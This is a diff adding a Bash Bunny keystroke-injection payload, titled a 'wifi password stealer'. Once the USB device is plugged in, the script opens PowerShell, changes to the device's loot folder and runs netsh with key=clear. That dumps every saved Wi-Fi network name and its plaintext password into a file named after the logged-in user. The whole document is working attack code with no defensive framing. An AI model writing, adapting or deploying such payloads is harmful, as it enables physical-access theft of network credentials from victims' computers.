@@ -1,0 +1,22 @@
+REM bashbunny wifi password stealer
+REM created by : blue cosmo
+
+REM open powershell
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 300
+
+REM cd into bashbunny labled 'BashBunny'
+STRING $u=gwmi Win32_Volume|?{$_.Label -eq'BashBunny'}|select name;cd $u.name
+ENTER
+DELAY 100
+STRING cd loot
+ENTER
+DELAY 100
+
+REM save wifi passwords to a file
+REM file will be named after the username
+STRING (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize >$env:UserName".txt"; exit
+ENTER
